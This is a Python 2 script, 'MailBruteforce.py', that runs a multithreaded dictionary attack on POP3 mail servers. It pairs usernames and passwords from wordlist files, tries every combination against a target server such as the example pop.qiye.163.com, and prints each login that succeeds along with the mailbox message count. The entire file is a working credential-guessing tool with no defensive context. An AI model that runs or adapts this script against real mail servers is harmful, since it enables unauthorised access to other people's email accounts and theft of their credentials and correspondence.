# !usr/bin/python                                           #
# -*- coding: utf-8 -*-                                     #
#-----------------------------------------------------------#
#MailBruteforce.py version 0.10                             #
#Author: linglingqi  (2016.07.13)                           #
#-------Modules---------------------------------------------#
import threadpool
import time
import poplib
import sys
import optparse
#-------Variables-------------------------------------------#
user_list=[]
pass_list=[]
userpass_list=[] 
payload_num=0
success_results=[]
user_file_path=""
pass_file_path=""
domain_intruded=""
port_intruded=""
threads_num=0
delay_time=0
userpass_check_type=False   
auto_extract_domain=False
remove_suffix=False
#--------Functions------------------------------------------#
def print_result(request, result):
    print '-'*80
    print result
    
def checkserver(domain):
    #Check the sever connection
    try:
        if port_intruded==995:
            pop_chk=poplib.POP3_SSL(domain,port_intruded)
        else:
            pop_chk=poplib.POP3(domain,port_intruded)
        pop_chk.quit()
        return True
    except Exception,e:
        print "\n[+] Error: %s"%(e)
        return False

def dict_processing():

    try:
        global payload_num
        user_file=open(user_file_path,'r')
        for user_line in user_file.readlines():
            if len(user_line.strip())>1:
                user_list.append(user_line)
        pass_file=open(pass_file_path,'r')
        for pass_line in pass_file.readlines():
            if len(pass_line.strip())>1:
                pass_list.append(pass_line)
        
        #if try to all user/pass combination        
        if userpass_check_type:
            for username in user_list:
                for password in pass_list:
                    info="%s:%s"%(username.strip(),password.strip())
                    userpass_list.append(info)
                    payload_num+=1
        else:
            for i in range(min(len(user_list),len(pass_list))):
                info="%s:%s"%(user_list[i].strip(),pass_list[i].strip())
                userpass_list.append(info)
                payload_num+=1
        user_file.close()
        pass_file.close()
        
    except Exception,e:
        print "[-] Error: %s\n"%(e)
        sys.exit(1)

def mailbruteforce(login_info):
    try:
        user_pass=login_info.split(":")
        login_user=user_pass[0].strip()
        login_pass=user_pass[1].strip()
        server_checked=domain_intruded
        
        #extract the domain from username
        if auto_extract_domain and login_user.find("@")>0:
            str_extract=login_user.split("@")
            if remove_suffix:
                login_user=str_extract[0]
            server_checked=str_extract[1]
        if port_intruded==995:
            pop_login=poplib.POP3_SSL(server_checked,port_intruded)
        else:
            pop_login=poplib.POP3(server_checked,port_intruded)
        pop_login.user(login_user)
        auth=pop_login.pass_(login_pass)
        if  "+OK" in auth:
            success_results.append(login_info)
            feeback_info="[+] Success: User: %s, Pass: %s, Server: %s, Mails: %s"%(login_user,login_pass,server_checked,pop_login.stat()[0])
        pop_login.quit()
    except Exception,e:
        feeback_info="[+] Error: User: %s, Pass: %s, Server: %s, %s"%(login_user,login_pass,server_checked,e)
    
    #delaying time,reduce error to connect sever
    time.sleep(delay_time)
    return feeback_info
    
if __name__=='__main__':
    USAGE_MSG="%prog [Options]..." 
    parser=optparse.OptionParser(USAGE_MSG)
    parser.add_option("-U",action="store",type="string",dest="users_dict",default="default_user",help="Dictionary of username")
    parser.add_option("-P",action="store",type="string",dest="passwords_dict",default="default_pass",help="Dictionary of password")
    parser.add_option("-s",action="store",type="string",dest="server",default="",help="Server intruded. Example: pop.qiye.163.com")
    parser.add_option("-p",action="store",type="int",dest="server_port",default=110,help="Port of sever intruded, default=110")
    parser.add_option("-t",action="store",type="int",dest="threads_setup",default=10,help="Number of running thread, default=10")
    parser.add_option("-d",action="store",type="float",dest="delay_setup",default=0.5,help="Thread delay time, default=0.5")
    parser.add_option("-E",action="store_true",dest="extract_domain",help="Automatically extract domain from username contained '@'")
    try:
        if len(sys.argv)==1:
            (options,args)=parser.parse_args(["-h"])
        else:
            (options,args)=parser.parse_args()
            auto_extract_domain=options.extract_domain
            user_file_path=options.users_dict
            pass_file_path=options.passwords_dict
            domain_intruded=options.server
            port_intruded=options.server_port
            threads_num=options.threads_setup
            delay_time=options.delay_setup
    except Exception,e:
        print "[+] Error %s"%(e)
        (options,args)=parser.parse_args(["-h"])
    
    #if remove the domain suffix from username    
    if auto_extract_domain:
        user_input=raw_input("Do you remove domain suffix from username?[y/n]: ")
        if user_input=="y" or user_input=="Y":
            remove_suffix=True
        else:
            remove_suffix=False
    
    if checkserver(domain_intruded) or auto_extract_domain:
        user_input=raw_input("Do you check all of the users and passwords combination?[y/n]: ")
        if user_input=="y" or user_input=="Y":
            userpass_check_type=True
        else:
            userpass_check_type=False
        
        #process user and pass, generate a new userpass_list
        dict_processing() 
        #print main information checked
        print "\n[+] Thread num: %s"%(threads_num)
        print "[+] Server: %s"%(domain_intruded)
        print "[+] Users loaded: %s"%(len(user_list))
        print "[+] Passwords loaded: %s"%(len(pass_list))
        print "[+] Payload num: %s\n"%(payload_num)
        
        #Creat threadpool
        pool=threadpool.ThreadPool(threads_num)
        requests=threadpool.makeRequests(mailbruteforce,userpass_list,print_result)
        [pool.putRequest(req) for req in requests]
        pool.wait()
        pool.dismissWorkers(threads_num, do_join=True)#To use dismissWorkers,prevent mistakes
        
        #print the success result
        print "\n"
        print "-"*80
        print "[-] Done."
        for result_out in success_results:
            print "[-] Successful login: %s"%(result_out)